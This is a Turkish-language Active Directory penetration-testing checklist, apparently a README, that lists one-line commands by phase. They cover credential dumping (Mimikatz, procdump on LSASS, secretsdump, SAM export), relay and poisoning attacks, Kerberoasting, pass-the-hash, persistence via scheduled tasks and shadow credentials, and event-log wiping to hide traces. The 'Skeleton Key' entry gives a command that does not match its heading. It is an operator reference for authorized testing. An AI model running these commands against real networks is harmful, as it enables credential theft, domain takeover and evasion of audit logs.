# Active Directory Pentest Kontrol Listesi

## 👍 Credential Gathering

- [ ] **Kullanıcı Adlarını ve Parolaları Topla**
  - **Komut**: `rpcclient -U "" [DC-IP]`
- [ ] **DC'deki Misafir Oturumlarını Kontrol Et**
  - **Komut**: `net use \\\[DC-IP] /user:guest`
- [ ] **LAPS (Local Administrator Password Solution) Parolalarını Kontrol Et**
  - **Komut**: `powershell -command "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd"`
- [ ] **Ntlmrelayx ile Kimlik Bilgilerini Yakala**
  - **Komut**: `python3 ntlmrelayx.py -smb2support`
- [ ] **SAM Dosyasını Ele Geçir ve Analiz Et**
  - **Komut**: `reg save hklm\sam sam.save`
- [ ] **Cached Credentials İçin LSASS Belleğini Analiz Et**
  - **Komut**: `procdump.exe -ma lsass.exe`
- [ ] **NTDS.dit Dosyasını Çıkar ve Hashleri Dump Et**
  - **Komut**: `secretsdump.py -just-dc [user]:[password]@[IP]`
- [ ] **Mimikatz Kullanarak Kimlik Bilgilerini Çıkar**
  - **Komut**: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- [ ] **Windows Credential Manager'dan Kimlik Bilgilerini Topla**
  - **Komut**: `cmdkey /list`
- [ ] **Group Policy Preferences (GPP) Şifrelerini Keşfet**
  - **Komut**: `findstr /S /I /C:"password" \\\[domain]\SYSVOL`
- [ ] **Responder veya Inveigh ile Kimlik Bilgisi Toplamayı Dene**
  - **Komut**: `responder -I [network_interface]`
  - **PowerShell Komut**: `Invoke-Inveigh`
- [ ] **Certify Kullanarak ADCS (Active Directory Certificate Services) Yapılandırmasını Analiz Et**
  - **Komut**: `Certify.exe find`
- [ ] **LAPSToolkit ile LAPS Yapılandırmasını Keşfet**
  - **Komut**: `Get-LAPSComputers`
- [ ] **KeeTheft ile Windows Credential Manager Şifrelerini Topla**
  - **Komut**: `KeeTheft.exe dump`
- [ ] **SafetyKatz veya BetterSafetyKatz ile Bellekten Kimlik Bilgisi Dump Et**
  - **Komut**: `SafetyKatz.exe sekurlsa::logonpasswords`
- [ ] **KrbRelay veya KrbRelayUp Kullanarak Kerberos Relay Saldırısını Dene**
  - **Komut**: `KrbRelay.exe -dc-ip [DC-IP]`
- [ ] **GMSAPasswordReader ile gMSA Şifrelerini Çıkar**
  - **Komut**: `GMSAPasswordReader.exe`

## 👍 Enumeration

- [ ] **Domain Kullanıcılarını Listele**
  - **Komut**: `Get-ADUser -Filter *`
- [ ] **Domain Gruplarını Kontrol Et**
  - **Komut**: `Get-ADGroup -Filter *`
- [ ] **Domain Controller (DC) Yapılandırmasını Kontrol Et**
  - **Komut**: `nltest /dclist:domainname`
- [ ] **LDAP Bağlantılarını Kontrol Et**
  - **Komut**: `ldapsearch -x -H ldap://[DC-IP] -b "DC=domain,DC=com"`
- [ ] **GPO (Group Policy Objects) Ayarlarını İncele**
  - **Komut**: `gpresult /h report.html`
- [ ] **Forest ve Domain Trust İlişkilerini Analiz Et**
  - **Komut**: `Get-ADTrust -Filter *`
- [ ] **Domain Policy Bilgilerini Kontrol Et**
  - **Komut**: `Get-DomainPolicy`
- [ ] **Açık Paylaşımları (Shares) Listele**
  - **Komut**: `net view \\\[IP]`
- [ ] **Kerberos SPN'leri Listele**
  - **Komut**: `GetUserSPNs.py -request -dc-ip [DC-IP] [domain/user]`
- [ ] **SharpHound ile AD Ortamını Analiz Et**
  - **Komut**: `SharpHound.exe -c All`
- [ ] **ADRecon ile Detaylı Raporlama Yap**
  - **Komut**: `ADRecon.ps1`
- [ ] **PowerView Kullanarak AD Bilgilerini İncele**
  - **Komut**: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`
- [ ] **bloodyAD ile AD Yapılandırmasını Analiz Et**
  - **Komut**: `bloodyAD -u [user] -p [password] -d [domain]`
- [ ] **SharpView ile AD Nesnelerini Detaylı Analiz Et**
  - **Komut**: `SharpView.exe`
- [ ] **ADFSDump Kullanarak ADFS Yapılandırmasını Analiz Et**
  - **Komut**: `ADFSDump.exe`

## 👍 Lateral Movement

- [ ] **Uzak Masaüstü Protokolü (RDP) Üzerinden Bağlantı**
  - **Komut**: `mstsc /v:[IP]`
- [ ] **Pass-The-Hash Saldırıları İçin NTLM Hashlerini Kullan**
  - **Komut**: `impacket-psexec [user]:[hash]@[IP]`
- [ ] **PrintSpoofer ile Yetki Yükseltme Yap**
  - **Komut**: `PrintSpoofer.exe -i`
- [ ] **JuicyPotato veya GodPotato Kullanarak Hak Yükseltme Yap**
  - **Komut**: `JuicyPotato.exe -t *`
- [ ] **PetitPotam Saldırısını Gerçekleştir**
  - **Komut**: `PetitPotam.py -d [domain] -u [user] -p [password]`
- [ ] **SharpMove ile Lateral Movement Gerçekleştirin**
  - **Komut**: `SharpMove.exe -d [domain] -u [user] -p [password]`
- [ ] **RestrictedAdmin Modunda RDP ile Bağlantı**
  - **Komut**: `mstsc /restrictedadmin /v:[IP]`
- [ ] **SharpRDP ile RDP Saldırılarını Test Edin**
  - **Komut**: `SharpRDP.exe -target [IP] -u [user] -p [password]`
- [ ] **NetworkServiceExploit ile Ağ Hizmetlerini Hedef Alarak Lateral Movement Gerçekleştirin**
  - **Komut**: `NetworkServiceExploit.exe`

## 👍 Privilege Escalation

- [ ] **Kerberoasting Saldırılarını Test Et**
  - **Komut**: `GetUserSPNs.py -request -dc-ip [DC-IP] [domain/user]`
- [ ] **Certify ile ADCS Zafiyetlerini Test Et**
  - **Komut**: `Certify.exe request /ca:[CA Name]`
- [ ] **Rubeus Kullanarak Kerberos Bileti Oluştur**
  - **Komut**: `Rubeus.exe asktgt /user:[user] /rc4:[hash]`
- [ ] **NoPac Saldırısını Test Et**
  - **Komut**: `python3 noPac.py -dc-ip [DC-IP]`
- [ ] **Powermad ile ACL Düzenlemesi Yaparak Hak Yükseltme Yap**
  - **Komut**: `New-MachineAccount`
- [ ] **SharpKatz ile Bellekten Hashleri Dump Et**
  - **Komut**: `SharpKatz.exe sekurlsa::logonpasswords`
- [ ] **RunasCs ile Yüksek Haklara Sahip Bir Kullanıcı Olarak İşlem Başlat**
  - **Komut**: `RunasCs.exe -u [user] -p [password] -d [domain]`
- [ ] **SharpUp ile Yanlış Yapılandırmaları Kontrol Ederek Hak Yükseltme Yap**
  - **Komut**: `SharpUp.exe`
- [ ] **Whisker ile Shadow Credentials Oluştur ve Kullan**
  - **Komut**: `Whisker.exe create /target:[user]`
- [ ] **PassTheCert ile Sertifika Bazlı Saldırılar Gerçekleştir**
  - **Komut**: `PassTheCert.exe`

## 👍 Persistence

- [ ] **AdminSDHolder Özelliklerini Kontrol Et**
  - **Komut**: `Get-ADObject -Filter {name -eq "AdminSDHolder"}`
- [ ] **Scheduled Task Oluşturarak Kalıcılık Sağla**
  - **Komut**: `schtasks /create /tn [taskname] /tr [command] /sc onlogon`
- [ ] **Skeleton Key Yükleyerek DC'yi Manipüle Et**
  - **Komut**: `mimikatz "privilege::debug sekurlsa::logonpasswords"`
- [ ] **Acl-Backdoor Kullanarak Kalıcı Erişim Sağla**
  - **Komut**: `Set-DomainObjectAcl`
- [ ] **Shadow Credentials ile Kalıcılık Sağla**
  - **Komut**: `Whisker.exe create /target:[user]`
- [ ] **Powermad ile Yeni Makine Hesapları Oluştur ve Kontrolü Ele Geçir**
  - **Komut**: `New-MachineAccount`
- [ ] **SharpChrome ile Tarayıcı Şifrelerini Al ve Kalıcılık Sağla**
  - **Komut**: `SharpChrome.exe`

## 👍 Additional Checks

- [ ] **ADCS (Active Directory Certificate Services) Yapılandırmasını Analiz Et**
  - **Komut**: `certutil -dump`
- [ ] **DNS Zone Transfer'ı Kontrol Et**
  - **Komut**: `dig @<DNS-Server> <domain> axfr`
- [ ] **SMB Signing'in Devre Dışı Olup Olmadığını Kontrol Et**
  - **Komut**: `smbclient -L //[IP] -N`
- [ ] **LLMNR ve NBT-NS Zehirlenmesine Karşı Savunmasızlığı Kontrol Et**
  - **Komut**: `responder -I [network_interface] -w`
- [ ] **MS17-010 (EternalBlue) Zafiyetini Test Et**
  - **Komut**: `nmap -p445 --script smb-vuln-ms17-010 [IP]`
- [ ] **PowerUp ile Yanlış Yapılandırmaları Test Et**
  - **Komut**: `PowerUp.ps1`
- [ ] **Seatbelt ile Endpoint Konfigürasyonlarını İncele**
  - **Komut**: `Seatbelt.exe all`

## 👍 Cleanup

- [ ] **Kullanılan Araç ve Scriptleri Sistemden Temizle**
  - **Komut**: `del /q /f [scriptname]`
- [ ] **Event Logs Üzerinde İz Bırakmamak İçin Log Temizle**
  - **Komut**: `Clear-EventLog -LogName *`
- [ ] **Kullanıcı İzlerini Silmek İçin Temporary Dosyaları Temizle**
  - **Komut**: `del /q /f %temp%\*`

---

Bu liste, Active Directory pentest işlemleri sırasında tüm aşamalarda kapsamlı bir rehber sunar. Her bölümde belirtilen araç ve komutlar, sıklıkla kullanılan teknikler ve iyi uygulamaları temsil eder.
